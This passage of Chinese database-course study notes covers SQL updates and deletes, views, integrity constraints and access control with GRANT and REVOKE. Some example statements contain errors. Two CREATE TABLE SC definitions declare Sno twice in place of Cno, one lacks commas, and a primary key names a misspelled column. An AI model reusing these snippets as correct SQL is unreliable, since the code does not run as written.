class="markdownIt-Anchor" href="#二修改数据-update">#</a> 二，修改数据 (UPDATE)</h5><p><strong>语法：格式如下，其功能是修改指定表中满足 <code>WHERE</code>  子句条件的元组</strong></p><ul><li>如果省略 WHERE 子句，则表示要修改表中所有元组<br><img src="https://img-blog.csdnimg.cn/ae9586d56ff742f4b98bbcdef7722ac6.png" alt="修改数据"><br>例子：将学生 201215121 的年龄改为 22 岁</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE student</span><br><span class="line">set Sage=22</span><br><span class="line">WHERE Sno=&#x27;201215121&#x27;;</span><br></pre></td></tr></table></figure><p>修改多个元组的值：将所有学生的年龄增加一岁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE student</span><br><span class="line">set Sage=Sage+1;</span><br></pre></td></tr></table></figure><h5 id="三删除数据-delete"><a class="markdownIt-Anchor" href="#三删除数据-delete">#</a> 三，删除数据 (DELETE)</h5><p><strong>语法：格式如下，其功能是从指定表中删除满足 <code>WHERE</code>  子句条件的所有元组，注意</strong></p><ul><li><code>DELETE</code>  删除的是表的数据，而不是表的定义</li><li>如果省略 <code>WHERE</code>  子句，那么就表示删除全部元组<br><img src="https://img-blog.csdnimg.cn/e45c2afc96444072be578fdaa0d0cb17.png" alt="删除数据"><br><strong>注意事项：在进行数据库数据的更新时，需要保证数据库的一致性，以及约束条件</strong></li></ul><h3 id="视图"><a class="markdownIt-Anchor" href="#视图">#</a> 视图</h3><h5 id="一关于视图"><a class="markdownIt-Anchor" href="#一关于视图">#</a> 一，关于视图</h5><p>【定义】视图是一个<strong>虚表</strong>，其本质就是一条 <code>SELECT</code>  语句，而查询结果被赋予了一个名字，也即视图名字。或者说视图本身不包含任何数据，它只包含映射到基表的一个查询语句，当基表数据发生变化时，视图数据也随之变化。其目的就是在于方便，简化数据操作。<br><strong>视图的作用：</strong></p><ul><li>视图能够简化用户的操作</li><li>视图使用户能以多种角度看待同一数据</li><li>视图对重构数据库提供了一定程度的逻辑独立性</li><li>视图能够对机密数据提供安全保护</li><li>适当的利用视图可以更清晰的表达查询</li></ul><h5 id="二视图的定义和删除"><a class="markdownIt-Anchor" href="#二视图的定义和删除">#</a> 二：视图的定义和删除</h5><p><strong>1, 视图的定义</strong><br><strong>语法：使用 <code>CREATE VIEW</code>  语句创建视图，格式如下</strong><br><img src="https://img-blog.csdnimg.cn/35453393eb694f159939b678b6dd963f.png" alt="建立视图"></p><ul><li>子查询可以是<strong>任意的 <code>SELECT</code>  语句</strong>（是可以含有 <code>ORDER BY</code>  子句和 <code>DISTINCT</code>  短语取决于具体系统）</li><li>组成视图的属性列名<strong>要么全部省略要么全部指定，不能有第三种情况</strong></li><li>如果省略视图列名，则其列名默认由 <strong> <code>SELECT</code>  子句目标列诸字段组成</strong><br>例子：建立信息系 IS 学生的视图</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW IS_student</span><br><span class="line">AS </span><br><span class="line">SELECT Sno,Sname,Sage,Sdept</span><br><span class="line">FROM student</span><br><span class="line">WHERE Sdept=&#x27;IS&#x27;</span><br></pre></td></tr></table></figure><p>视图也可以基于多个表，同一，视图可以基于视图创建，也可以带有表达式。<br>例子：定义一个反映学生出生年份的视图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW birthday(Sno,Sname,Syear)</span><br><span class="line">AS</span><br><span class="line">SELECT Sno,Sname,2022-Sage</span><br><span class="line">FROM student;</span><br></pre></td></tr></table></figure><p><strong>注意：在定义视图时如果有  <code>WITH CHECK OPTION</code>  子句，则在对视图进行 UPDATE,INSERT,DELETE 时要保证更新，插入，删除的行满足视图定义的谓词条件。</strong><br><strong>2，视图的删除</strong></p><ul><li>基本表删除之后，由该基本表导出的所有视图均无法使用，<strong>但是视图的定义没有从字典中清除</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP VIEW &lt;视图名&gt; [CASCADE];</span><br></pre></td></tr></table></figure><h5 id="三视图的查询"><a class="markdownIt-Anchor" href="#三视图的查询">#</a> 三，视图的查询</h5><p><strong>语法：从用户角度出发，查询视图和查询基本表相同；从 DBMS 角度出发，采用视图消解法，具体来讲</strong></p><ul><li>首先进行<strong>有效性检查</strong></li><li>接着转换成<strong>等价的</strong>对基本表的查询</li><li>最后执行<strong>修正</strong>后的查询</li></ul><h5 id="四视图的更新"><a class="markdownIt-Anchor" href="#四视图的更新">#</a> 四，视图的更新</h5><p><strong>语法：视图是虚表，所以对视图的更新最终会转化为对基本表的更新。为了防止用户通过视图对数据进行更新时，有意或无意地对不属于视图范围内的基本表数据进行操作，可以在定义视图时加上 <code>WITH CHECK OPTION</code>  子句。这样在更新时，如果不满足条件，DBMS 会拒绝操作</strong><br><strong>（1）UPDATE</strong><br> 例如：如果在定义视图 <code>is_student</code>  在定义时加入了 <code>WITH CHECK OPTION</code>  子句，接着再执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE is_student</span><br><span class="line">SET Sdept=&#x27;MA&#x27;</span><br><span class="line">WHERE Sno=&#x27;201215125&#x27;;</span><br></pre></td></tr></table></figure><p>那么在更新时如果将 <code>Sdept</code>  字段改为了’MA’或其他值，DBMS 就会拒绝执行。<br><strong>（2）INSERT</strong><br> 向信息系学生视图 <code>IS_Student</code>  中插入一个新的学生记录：201215129，赵新，20 岁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO is_student</span><br><span class="line">VALUES(&#x27;201215129&#x27;,&#x27;赵新&#x27;,20);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/3df7025dcf304f8d85098a071791c41e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="插入操作"></p><ul><li>这里视图没有数据，且 20 插入到了错误的地方（如果没有 <code>WITH CHECK OPTION</code>  就会导致这些错误出现）</li><li>如果假如了 <code>WITH CHECK OPTION</code> ，那么 DBMS 会拒绝执行<br><strong>（3）DELETE</strong><br> 删除数据时，有没有 <code>WITH CHECK OPTION</code>  是一样的。</li></ul><h1 id="四数据库完整性"><a class="markdownIt-Anchor" href="#四数据库完整性">#</a> 四，数据库完整性</h1><p>【定义】数据库完整性是指数据的正确性和相容性。</p><ul><li><strong>正确性</strong>：数据是符合现实世界语义、反映当前实际状况的。例如性别只能是男或女</li><li><strong>相容性</strong>：是指数据库同一对象在不同关系表中的数据是符合逻辑的。比如说年龄一般都在 1-100 岁，当然也有超过一百岁的，反正没有两百岁，三百岁成仙的人类<br><strong>数据库完整性和安全性的区别：</strong></li><li><strong>完整性</strong>：是为了防止数据库中存在<strong>不符合语义的数据</strong>，也就是防止数据库中存在<strong>不正确的数据</strong>。因此，完整性检查和控制的防范对象是<strong>不合语义的、不正确的数据，防止它们进入数据库</strong></li><li><strong>安全性</strong>：是保护数据库<strong>防止恶意破坏和非法存取</strong>。因此，安全性控制的防范对象是<strong>非法用户和非法操作，防止他们对数据库数据的非法存取</strong><br> ** 为维护完整性 DBMS 必须要实现的功能</li><li>提供定义完整性约束条件的机制</li><li>提供完整性检查的方法</li><li>进行违约处理</li></ul><h3 id="数据库三大完整性"><a class="markdownIt-Anchor" href="#数据库三大完整性">#</a> 数据库三大完整性</h3><h4 id="一实体完整性"><a class="markdownIt-Anchor" href="#一实体完整性">#</a> 一，实体完整性</h4><p>若属性 A 时基本关系 R 的<strong>主属性</strong>，则属性 A<strong> 不能取空值</strong><br><strong>（1）定义实体完整性</strong><br>定义方法：关系模型的实体完整性在 <code>CREATE TABLE</code>  中用 <code>PRIMARY KEY</code>  定义。注意：</p><ul><li><strong>如果主码仅有一个属性（单属性）</strong>：可以定义为<strong>列级约束条件</strong>也可以定义为<strong>表级约束条件</strong></li><li><strong>如果主码有多个属性</strong>：注意<strong>仅能定义为表级约束条件</strong><br><strong>（2）实体完整性的检查和违约处理</strong></li><li><strong>检查主码值是否唯一，如果不唯一则拒绝插入或修改</strong></li><li><strong>检查主码的各个属性是否为空，只要有一个为空就拒绝插入或修改</strong><br><strong>其中检查记录中主码值是否唯一有两种方法：</strong></li><li>全表扫描：十分耗时</li><li>建立索引：关系数据库管理系统一般都会在主码上自动建立一个索引</li></ul><h4 id="二参照完整性"><a class="markdownIt-Anchor" href="#二参照完整性">#</a> 二，参照完整性</h4><p><strong>（1）定义参照完整性</strong><br><strong>定义方法：关系模型的参照完整性在 <code>CREATE TABLE</code>  中用 <code>FOREIGN KEY</code>  定义，同时用 <code>REFERENCES</code>  短语指明这些外码参照哪些表的主码</strong><br>定义 <code>sc</code>  表的时候，其 <code>(Sno,Cno)</code>  是主码，分别参照 <code>Sudent</code>  的主码和 <code>Course</code>  表的主码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9) NOT NULL,</span><br><span class="line">Sno CHAR(4) NOT NULL,</span><br><span class="line">Grade SMALLINT,</span><br><span class="line"></span><br><span class="line">PRIMARY KEY(Sno,Cno),</span><br><span class="line">FOREIGN KEY(Sno) REFERENCES Student(Sno),</span><br><span class="line">FOREIGN KEY(Cno) REFERENCES Course(Cno)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>（2）参照完整性检查和违约处理</strong><br><strong> A：破坏完整性的行为</strong><br>参照完整性将表与表联系在了一起，所以对其中一个表的修改很可能会影响到另外一张表。举个例子，被参照表是 <code>Student</code> ，参照表是 <code>sc</code> ，破坏参照完整性的行为及其违约处理如下表所示：<br><img src="https://img-blog.csdnimg.cn/e4864b3c42ec4a80bda80abd90f6e55e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="参照完整性"><br><strong>对于参照表 <code>sc</code>  的行为：</strong></p><ul><li><strong>向 <code>sc</code>  表（参照表）中插入一个元组，这是会被拒绝的</strong>。因为有可能你所插入的元组的 <code>Sno</code> （外码）无法在 <code>Student</code>  表中找到，这就意味着在成绩表中插入了一个非本班同学的成绩，这显然是不合理的</li><li><strong>修改 <code>sc</code>  表（参照表）中的一个元组，这是会被拒绝的</strong>。因为有可能你会修改该元组的 <code>Sno</code> （外码），这就可能导致 <code>Sno</code>  无法在 <code>Student</code>  表中找到。</li><li><strong>删除 <code>sc</code>  表（参照表）中的一个元组，这是可行的</strong>。因为它无非就是一条成绩信息。<br><strong>对于被参照 <code>Student</code>  的行为：</strong></li><li><strong>删除 <code>Student</code>  表（被参照表）中的一个元组，这是会被拒绝（也有可能级联删除或设为 <code>NULL</code> ）的</strong>。因为删除一个元组后，该元组所对应的 <code>Sno</code> （主码）将不复存在，这就有可能导致 <code>sc</code>  表（参照表）中某些元组的 <code>Sno</code> （外码）在 <code>Student</code>  表中找不到。当然可以级联删除将 SC 表的相关内容一起删除。</li><li><strong>修改 <code>Student</code>  表（被参照表）中的一个元组，这是会被拒绝（也有可能级联删除或设为 <code>NULL</code> ）的</strong> 。因为一旦修改了该元组的 <code>Sno</code>  属性，就会发生和上面一样的问题。可以进行级联修改，这回导致 SC 表中的数据也被修改</li><li><strong>向 <code>Student</code>  表（被参照表）插入一个元组，这是可行的</strong>。因为它无非就是一个新同学嘛<br><strong> B，违约处理措施</strong><br>①拒绝：不允许操作，为默认策略<br>②级联：上述提到了。级联删除或修改会影响到其他与他相关的表的数据。<br>③设为空值：当删除或修改 <code>专业</code> 表（被参照表）的一个元组时造成了不一致，则<strong>将 <code>学生</code> 表（参照表）中的所有造成不一致的元组的对应属性（专业号）设为空值</strong></li><li>比如删除 <code>专业</code> 表中专业号为 12 的专业，那么接着就要把 <code>学生</code> 表中专业号 = 12 的所有元组的专业号设置为空值<br><strong> C：SQL 实现</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9)</span><br><span class="line">Sno CHAR(4) </span><br><span class="line">Grade SMALLINT,//是外码也是主码，故不能取空值，实体完整性</span><br><span class="line">PRIMARY KEY(Sno,Cno),</span><br><span class="line">FOREIGN KEY(Sno) REFERENCES Student(Sno)</span><br><span class="line">ON DELETE CASCADE //删除Student表的元组时，级联删除本表相应元组</span><br><span class="line">ON UPDATE CASCADE, //更新Student表中的Sno时，级联更新本表相应元组</span><br><span class="line">FOREIGN KEY(Cno) REFERENCES Course(Cno)</span><br><span class="line">ON DELETE NO ACTION //删除Course表的元组造成不一致时，拒绝执行</span><br><span class="line">ON UPDATE CASCADE //更新Course表中的Cno时，级联更新本表相应元组</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="三用户自定义完整性"><a class="markdownIt-Anchor" href="#三用户自定义完整性">#</a> 三，用户自定义完整性</h4><p>用户自定义完整性针对某一具体关系数据库的约束条件，反映<strong>某一具体应用所涉及的数据必须满足的语义要求</strong><br><strong>（1）属性上的约束条件</strong><br><strong> A: 不允许取空值 (NOT NULL)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9),</span><br><span class="line">Cno CHAR(4),</span><br><span class="line">Grade SMALLINT NOT NULL,</span><br><span class="line">PRIMARY KEY(Sno,Cno)//定义了实体完整性，隐含了不允许取空值，在列级中可不写</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>B：列值唯一（UNIQUE）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE DEPT</span><br><span class="line">(</span><br><span class="line">Deptno NUMERIC(2),</span><br><span class="line">Dname CHAR(9) UNIQUE NOT NULL, //唯一且不能取空值</span><br><span class="line">Location CHAR(10),</span><br><span class="line">PRIMARY KEY(Depto)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>C：满足指定条件（CHECK）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Student</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9) PRIMARY KEY,</span><br><span class="line">Sname CHAR(8) NOT NULL,</span><br><span class="line">Ssex CHAR(2) CHECK(Ssex IN (&#x27;男&#x27;,&#x27;女&#x27;)),</span><br><span class="line">Sage SMALLINT,</span><br><span class="line">Sdept CHAR(20)</span><br><span class="line">);</span><br><span class="line">-------------------------------------------</span><br><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9),</span><br><span class="line">Cno CHAR(4),</span><br><span class="line">Grade SMALLINT CHECK(Grade &gt;= 0 AND Grade &lt;= 100),</span><br><span class="line"></span><br><span class="line">PRIMARY KEY(Sno,Cno),</span><br><span class="line">FOREIGN KEY(Sno) REFERENCES Student(Sno),</span><br><span class="line">FOREIGN KEY(Cno) REFERENCES Course(Cno)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>（2）元组上的约束条件</strong><br>同属性值限制相比，元组级的限制可以设置<strong>不同属性之间</strong>的取值的相互约束条件<br>如，规定插入男性时，其名字不能以 <code>Ms.</code>  开头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Student</span><br><span class="line">(</span><br><span class="line">Sno Char(9),</span><br><span class="line">Sname CHAR(8) NOT NULL,</span><br><span class="line">Ssex CHAR(2),</span><br><span class="line">Sage SMALLINT,</span><br><span class="line">Sdept CHAR(20),</span><br><span class="line">PRIMARY KEY(Sno),</span><br><span class="line"></span><br><span class="line">CHECK(Ssex=&#x27;女&#x27; OR Sname NOT LIKE &#x27;Ms.%&#x27;)</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="约束命名子句断言和触发器"><a class="markdownIt-Anchor" href="#约束命名子句断言和触发器">#</a> 约束命名子句，断言和触发器</h3><p><s>这里老师的 PPT 似乎没有讲，先放一放，先找讲过的复习</s> ：）</p><h1 id="五数据库安全性"><a class="markdownIt-Anchor" href="#五数据库安全性">#</a> 五，数据库安全性</h1><p><s>这一章概念的东西好多，也不清除是不是需要记什么的</s><br>【定义】保护数据库以防止不合法使用所造成的数据泄露，更改或者破坏</p><h3 id="数据库安全性概述"><a class="markdownIt-Anchor" href="#数据库安全性概述">#</a> 数据库安全性概述</h3><h4 id="一数据库的不安全因素"><a class="markdownIt-Anchor" href="#一数据库的不安全因素">#</a> 一，数据库的不安全因素</h4><p><strong>1. 非授权用户对数据库的恶意存取和破坏:<strong> 一些</strong>黑客</strong>和<strong>犯罪分子</strong>在用户存取数据库时猎取用户名和用户口令，然后<strong>假冒</strong>合法用户偷取、修改甚至破坏用户数据。防范措施有:</p><ul><li><strong>用户身份鉴别</strong></li><li><strong>存取控制</strong></li><li><strong>视图</strong><br><strong> 2. 数据库中重要或敏感的数据被泄露:</strong> <strong>黑客和敌对分子</strong>千方百计盗窃数据库中的重要数据，一 - 些机密信息被暴露。防范措施有</li><li><strong>强制存取控制</strong></li><li><strong>数据加密存储</strong></li><li><strong>加密传输</strong><br><strong> 3. 安全环境的脆弱性</strong></li></ul><h4 id="二数据库安全性控制"><a class="markdownIt-Anchor" href="#二数据库安全性控制">#</a> 二：数据库安全性控制</h4><p><strong>数据库安全性控制的常用方法：</strong></p><ul><li>用户标识和鉴定（Identification &amp; Authentication）: 系统提供的最外层安全保护措施</li><li>存取控制：访问权限</li><li>通过视图调整授权 ：定义可向用户授权数据库特定部分的用户视图</li><li>审计：追踪信息，重现导致数据库现有状况的一系列事件</li><li>密码存储：使用加密技术保护机密数据</li></ul><h5 id="1用户身份鉴别"><a class="markdownIt-Anchor" href="#1用户身份鉴别">#</a> 1，用户身份鉴别</h5><p><strong>每个用户在系统中都有一个用户标识。每个用户标识由用户名（user name）和用户标识号（UID）组成。系统内部记录着所有合法用户的标识，每次用户进入系统时，系统会核对用户的身份，只有通过鉴定后才提供相关数据库管理系统的权限</strong><br><strong>（1）静态口令鉴别</strong><br><strong>（2）动态口令鉴别</strong><br><strong>（3）生物特征鉴别</strong><br><strong>（4）智能卡鉴别</strong></p><h5 id="2存取控制"><a class="markdownIt-Anchor" href="#2存取控制">#</a> 2，存取控制</h5><p><strong>存取控制的目的就是确保只授权给有资格的用户访问数据库的权限，其余人等无法接近数据。主要包括以下两个部分</strong></p><ul><li><strong>定义用户权限</strong>：用户对某一数据对象的操作权力称为<strong>权限</strong>。某个用户应该具有何种权限是个<strong>管理问题和政策问题</strong>，而不是技术问题。数据库管理系统的功能是<strong>保证这些决定的执行</strong>。为此，数据库管理系统必须提供适当的语言来<strong>定义用户权限</strong>，这些定义经过编译后存储在数据字典中，被称做<strong>安全规则或授权规则</strong></li><li><strong>合法权限检查</strong>：每当用户发出存取数据库的操作请求后 (请求一般应包括操作类型、操作对象和操作用户等信息)，数据库管理系统查找<a href="#lable">数据字典</a>，<strong>根据安全规则进行合法权限检查</strong>，若用户的操作请求超出了定义的权限，系统将<strong>拒绝执行此操作</strong><br><strong>而存取控制方法又分为以下两类：</strong></li></ul><h6 id="1自主存取控制dac"><a class="markdownIt-Anchor" href="#1自主存取控制dac">#</a> （1）自主存取控制 DAC</h6><p><strong>A，基本概念</strong><br><strong>自主存取控制 DAC：SQL 中自主存取控制主要是通过 <code>GRANT</code>  语句和 <code>REVOKE</code>  语句来实现的。是指用户可以 “自主” 地决定将数据的存取权限授予何人、决定是否也将 “授权” 的权限授予别人。</strong><br><strong>授权：用户权限由数据库对象和操作类型这两个要素组成。定义一个用户的存取权限就是定义这个用户可以在哪些数据对象上进行哪些类型的操作。所谓授权就是指定义存取权限</strong></p><ul><li>在<strong>非关系系统</strong>中，用户只能对<strong>数据</strong>进行操作，存取控制的数据库对象也仅限于数据本身</li><li>在<strong>关系数据库系统</strong>中，存取控制的对象不仅有数据本身 (基本表中的数据、属性列上的数据），还有<strong>数据库模式 (包括数据库、基本表、视图和索引的创建等)</strong><br> 下表就是<strong>关系数据库中的主要存取权限：</strong><br><img src="https://img-blog.csdnimg.cn/202afc8ee1314578ac465140b086d3af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="主要存取权限"><br><strong> B：GRANT 与 REVOKE</strong><br>SQL 中使用 <code>GRANT</code>  和 <code>REVOKE</code>  语句向用户<strong>授予或收回</strong>对数据的操作权限<br>①：<strong>GRANT</strong><br><strong> 语法：格式如下，其含义为授予指定用户对指定操作对象的指定操作权限。注意</strong></li><li>如果指定了 <code>WITH GRANT OPTION</code>  子句，则<strong>获得某种权限的用户还可以把这种权限再授权给其他用户</strong>。但不允许<strong>循环授权</strong></li><li>如果未指定 <code>WITH GRANT OPTION</code>  子句，则<strong>获得某种权限的用户只能使用但无法传播</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &lt;权限&gt;[,&lt;权限&gt;]…  </span><br><span class="line">[on &lt;对象类型&gt; &lt;对象名&gt;]  </span><br><span class="line">to &lt;用户&gt;[,&lt;用户&gt; …]  </span><br><span class="line">[with grant option];</span><br></pre></td></tr></table></figure><ul><li><strong>如果要授权所有权限，可以写 <code>ALL PRIVILEGES</code> </strong></li><li><strong>如果所有用户接受权限，可以写 <code>PUBLIC</code> </strong><br><strong> 以下对象可以发出 <code>GRANT</code> </strong></li><li>DBA</li><li>数据库对象的创建者</li><li>已经拥有该权限的用户<br>下面给出几个例子作为演示：<br>把<strong>查询</strong> Student 表的权限授权给用户 U1：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GRANT SELECT </span><br><span class="line">ON TABLE Student</span><br><span class="line">TO U1;</span><br></pre></td></tr></table></figure><p>把对表 SC 的查询权限授予所有用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GRANT SELECT</span><br><span class="line">ON TABLE SC</span><br><span class="line">TO PUBLIC;</span><br></pre></td></tr></table></figure><p>把对表 SC 的 INSERT 权限授予 U5 用户，并允许将此权限再授予其他用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GRANT INSERT</span><br><span class="line">ON TABLE SC</span><br><span class="line">TO U5</span><br><span class="line">WITH GRANT OPTION;  //表示其可以将授予它的权限授予其他人，但是在删除它权限时需要级联删除它授予的权限</span><br></pre></td></tr></table></figure><p><strong>②：REVOKE</strong></p><ul><li>如果加入 <code>CASCADE</code> ，表示<strong>收回某用户权限的同时也会把该用户所有授权过用户的权限一并收回</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">revoke &lt;权限&gt;[,&lt;权限&gt;]…  </span><br><span class="line">[on &lt;对象类型&gt; &lt;对象名&gt;]  </span><br><span class="line">from &lt;用户&gt;[,&lt;用户&gt; …]</span><br></pre></td></tr></table></figure><p><strong>③：创建数据库模式的权限</strong><br>前面所讲到都是对<strong>数据</strong>的操作权限，而对<strong>创建数据库模式类的数据库对象的授权则由数据库管理员在创建用户时实现</strong><br><strong>语法：使用 <code>CREATE USER</code>  语句创建用户，其格式如下。注意</strong></p><ul><li>只有系统的<strong>超级用户</strong>才有权创建一个新的数据库用户</li><li>新创建的数据库用户有三种权限： <code>CONNECT</code> 、 <code>RESCOURCE</code> 、 <code>DBA</code> <br><strong>C, 数据库角色</strong><br><strong>是被命名的一组与数据库操作相关的权限，也即角色是权限的集合。在创建用户时如果为其赋予某种角色，那么用户就自动拥有了该数据库角色所拥有的权限，从而省去了繁琐的授权语句</strong><br>综合演示：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//首先需要创建一个角色R1</span><br><span class="line">CREATE ROLE R1;</span><br><span class="line">//接着使用GRANT语句，使角色R1拥有对Student表的权限</span><br><span class="line">GRANT SELECT ,UPDATE,INSERT</span><br><span class="line">ON TABLE Student</span><br><span class="line">TO R1;</span><br><span class="line">//然后将这个角色授予用户U1、U2、U3，使他们具有角色R1所拥有的全部权限</span><br><span class="line">GRANT R1</span><br><span class="line">TO U1,U2,U3</span><br><span class="line">//最后，也可以通过R1来收回用户的权限</span><br><span class="line">REVOKE R1</span><br><span class="line">FROM U1;</span><br></pre></td></tr></table></figure><h6 id="2强制存取控制mac-ppt上扩展内容"><a class="markdownIt-Anchor" href="#2强制存取控制mac-ppt上扩展内容">#</a> （2）强制存取控制 MAC -ppt 上扩展内容</h6><p><s>先放一放，老师 PPT 似乎也没有讲到</s></p><h5 id="3视图"><a class="markdownIt-Anchor" href="#3视图">#</a> 3，视图</h5><p><strong>通过视图机制把要保密的数据对无权存取的用户隐藏起来，从而自动对数据提供一定程度的安全保护。</strong> 其主要的功能在于提供<strong>数据独立性</strong>。<br>在实际应用中通常是<strong>视图机制</strong>和<strong>授权机制</strong>进行配合使用。<br>这里给出一个例子：<br>在某大学中，假定王平老师只能检索计算机系学生的信息，系主任张明具有检索和增删改计算机系学生信息的所有权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIEW CS_Student</span><br><span class="line">AS</span><br><span class="line">SELECT *</span><br><span class="line">FROM Student</span><br><span class="line">WHERE Sdept=&#x27;CS&#x27;;</span><br><span class="line"></span><br><span class="line">GRANT SELECT</span><br><span class="line">ON CS_Student</span><br><span class="line">TO 王平;</span><br><span class="line"></span><br><span class="line">GRANT ALL PRIVILEGES</span><br><span class="line">ON CS_Student</span><br><span class="line">TO 张明;</span><br></pre></td></tr></table></figure><h5 id="4审计-ppt上扩展内容"><a class="markdownIt-Anchor" href="#4审计-ppt上扩展内容">#</a> 4，审计 -ppt 上扩展内容</h5><p><s>没讲</s></p><h5 id="5数据加密-ppt上扩展内容"><a class="markdownIt-Anchor" href="#5数据加密-ppt上扩展内容">#</a> 5，数据加密 -ppt 上扩展内容</h5><p><s>没讲</s></p><h4 id="三数据库产品安全性控制介绍-了解"><a class="markdownIt-Anchor" href="#三数据库产品安全性控制介绍-了解">#</a> 三，数据库产品安全性控制介绍 - 了解</h4><blockquote><p>这个是 PPT 上有，课本上没有的</p></blockquote><p><s>后面补充</s></p><h1 id="六查询处理与查询优化"><a class="markdownIt-Anchor" 